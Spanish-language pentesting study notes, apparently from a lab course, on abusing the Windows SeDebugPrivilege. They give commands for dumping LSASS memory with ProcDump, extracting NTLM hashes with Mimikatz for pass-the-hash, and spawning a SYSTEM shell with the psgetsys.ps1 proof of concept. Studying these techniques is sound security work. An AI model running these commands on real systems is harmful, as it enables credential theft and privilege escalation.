Se le asigna a un usuario para ejecutar una aplicacion, servicio o ayudar a la resolucion de problemas en lugar de añadirlo a la cuenta de adminsitradores

Se puede añadir a traves de politicas de grupo locales o de dominio. Por defecto solo esta para administradores ya que se puede capturar informacion sensible de la memoria, acceder al kernel y estructuras de aplicaciones


Si miramos los privs de un usuario con estos privilegios veremos SeDebugPrivilege

```
whoami /priv
```
![[Pasted image 20260818144033.png]]

Podemos usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) para aprovechar este privilegio y hacer un volcado de memoria de un proceso. Un buen candidato es LSASS que almacena credenciales de usuarios despues de que inicien sesion

```
procdump.exe -acceptula -ma lsass.exe lsass.dmp
```
![[Pasted image 20260818144147.png]]

Tras esto podemos cargar el dmp en Mimikatz y usar logonpasswords para obtener los NTLM de la cuenta de administrador local y hacer PtH

	Si escribimos log antes del comando de Mimikatz se guarda en un .txt

```
mimkatz.exe
> log
> sekurlsa::minidump lsass.dmp
> sekurlsa::logonpasswords
```

## Ejecucion remota de codigo con SYSTEM

Se lanza un proceso hijo y usando los privs de SeDebugPrivilege alteramos su comportamiento para heredar un token de proceso padre y suplantarlo (apuntariamos a un proceso padre con privs SYSTEM especificando su PID)

[script de PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1): lo transferimos al sistema objetivo

	Tiene una actualizacion: https://github.com/decoder-it/psgetsystem

1. Abrimos un PS como admin (credenciales de jordan)
2. Escribimos tasklist

```
tasklist
```
![[Pasted image 20260818145157.png]]

Podemos apuntar a winlogon.exe con PID 612 que sabemos que se ejecuta como SYSTEM

3. Ejecutamos el scrip

```
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"C:\Windows\System32\cmd.exe","")
```
![[Pasted image 20260818145319.png]]

Podemos usar Get-Process en vez de escribir el PID

```
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"C:\Windows\System32\cmd.exe","")
```
![[Pasted image 20260818145424.png]]
